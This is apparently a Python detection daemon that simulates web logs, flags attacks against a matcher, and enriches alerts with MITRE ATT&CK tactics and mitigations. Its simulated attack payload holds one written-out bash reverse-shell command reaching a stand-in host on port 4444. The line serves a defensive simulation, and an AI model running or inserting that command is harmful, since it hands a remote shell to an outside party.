import time
import random
import json
from collections import OrderedDict
from db_manager import CyberPathDB
from matcher import CyberMatcher
import os
import urllib.request
from mitreattack.stix20 import MitreAttackData

class CyberPathDaemon:
    def __init__(self, max_ram_size=5):
        self.max_ram_size = max_ram_size
        self.ram_cache = OrderedDict()
        self.mitre_file = "enterprise-attack.json"
        
        print("[DAEMON] Démarrage des services...")
        self.db = CyberPathDB()
        self.matcher = CyberMatcher()

        # --- GESTION AUTOMATIQUE DU FICHIER CTI ---
        if not os.path.exists(self.mitre_file):
            print(f"[!] {self.mitre_file} manquant. Téléchargement depuis le MITRE...")
            url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
            try:
                urllib.request.urlretrieve(url, self.mitre_file)
                print("✅ Téléchargement terminé.")
            except Exception as e:
                print(f"❌ Échec du téléchargement : {e}")

        try:
            self.mitre_cti = MitreAttackData(self.mitre_file)
            print("[DAEMON] CTI MITRE ATT&CK opérationnelle.")
        except Exception as e:
            print(f"[!] Mode dégradé : enrichissement limité ({e})")
            self.mitre_cti = None

    def simulate_incoming_log(self):
        ips = ["192.168.1.10", "192.168.1.20", "192.168.1.30", "10.0.0.5", "10.0.0.6", "10.0.0.7"]
        ip = random.choice(ips)
        
        # Simulation d'une attaque (10% de chance)
        if random.random() > 0.9:
            vector = [0.8, 0.9, 0.7, 1.0, 0.6]
            asset = "/admin/config.php"
            payload = "POST /admin/config.php body: cmd=bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
        else:
            vector = [random.uniform(0.1, 0.3) for _ in range(5)]
            asset = "/index.php"
            payload = f"GET {asset} HTTP/1.1 User-Agent: Mozilla/5.0"
            
        return ip, vector, asset, payload

    def process_log(self, ip, vector, asset, payload):
        # 1. Gestion du cache LRU
        if ip in self.ram_cache:
            self.ram_cache.move_to_end(ip)
        self.ram_cache[ip] = vector
        
        if len(self.ram_cache) > self.max_ram_size:
            oldest_ip, oldest_vector = self.ram_cache.popitem(last=False)
            uid_bin = self.db.register_entity(oldest_ip)
            self.db.insert_vector(uid_bin, oldest_vector)

        # 2. Analyse via le Matcher
        alerts, _ = self.matcher.predict_attack(vector, threshold=0.15)
        
        if alerts:
            for alert in alerts:
                tid = alert['tid']
                risk_score = round(1.0 - alert['distance'], 2)
                
                # Valeurs par défaut
                tech_name = alert['name']
                tactic = "Inconnu"
                mitigations_str = "[]" # On initialise un JSON vide par défaut
                sources_str = "Sources inconnues"
                
                # --- ENRICHISSEMENT PROFOND VIA MITRE-PYTHON ---
                if self.mitre_cti:
                    tech_obj = self.mitre_cti.get_object_by_attack_id(tid, 'attack-pattern')
                    
                    if tech_obj:
                        tech_name = tech_obj.name
                        
                        # A. Extraction de la Tactique
                        if hasattr(tech_obj, 'kill_chain_phases') and tech_obj.kill_chain_phases:
                            tactic = tech_obj.kill_chain_phases[0].phase_name.replace('-', ' ').title()
                        
                        # B. Extraction des Data Sources
                        if hasattr(tech_obj, 'x_mitre_data_sources'):
                            sources_str = ", ".join(tech_obj.x_mitre_data_sources[:3])

                        # C. Extraction des Mitigations (Format JSON complet)
                        try:
                            mitigation_entries = self.mitre_cti.get_mitigations_mitigating_technique(tech_obj.id)
                            mit_data = []
                            
                            for entry in mitigation_entries:
                                mit_obj = entry['object'] if isinstance(entry, dict) else getattr(entry, 'object', None)
                                if not mit_obj: continue
                                
                                m_id = "M????"
                                m_url = "https://attack.mitre.org/mitigations/"
                                
                                # Recherche de l'ID MITRE officiel (ex: M1033)
                                if hasattr(mit_obj, 'external_references'):
                                    for ref in mit_obj.external_references:
                                        if ref.source_name == 'mitre-attack':
                                            m_id = ref.external_id
                                            m_url = ref.url
                                            break
                                
                                # Calcul de l'impact (ROI) de la mitigation
                                protected_techs = self.mitre_cti.get_techniques_mitigated_by_mitigation(mit_obj.id)
                                protected_count = len(protected_techs) if protected_techs else 1
                                
                                mit_data.append({
                                    "id": m_id,
                                    "name": mit_obj.name,
                                    "url": m_url,
                                    "protects_count": protected_count
                                })
                                
                                if len(mit_data) >= 3: break # Top 3 pour l'interface
                            
                            if mit_data:
                                mitigations_str = json.dumps(mit_data)
                                
                        except Exception as e:
                            print(f"[!] Avertissement extraction Mitigations STIX: {e}")
                
                print(f"🚨 [DETECTION] {ip} -> {tech_name} ({tactic}) | Risk: {risk_score}")
                
                # 3. Insertion en base de données
                self.db.insert_alert(
                    ip, asset, payload, tid, risk_score, 
                    tech_name, tactic, mitigations_str, sources_str
                )

    def run(self):
        try:
            print("=== CYBER-PATH ENGINE RUNNING ===")
            while True:
                ip, vector, asset, payload = self.simulate_incoming_log()
                self.process_log(ip, vector, asset, payload)
                time.sleep(1.5)
        except KeyboardInterrupt:
            print("\n[DAEMON] Arrêt.")
        finally:
            self.db.close()

if __name__ == "__main__":
    daemon = CyberPathDaemon(max_ram_size=4)
    daemon.run()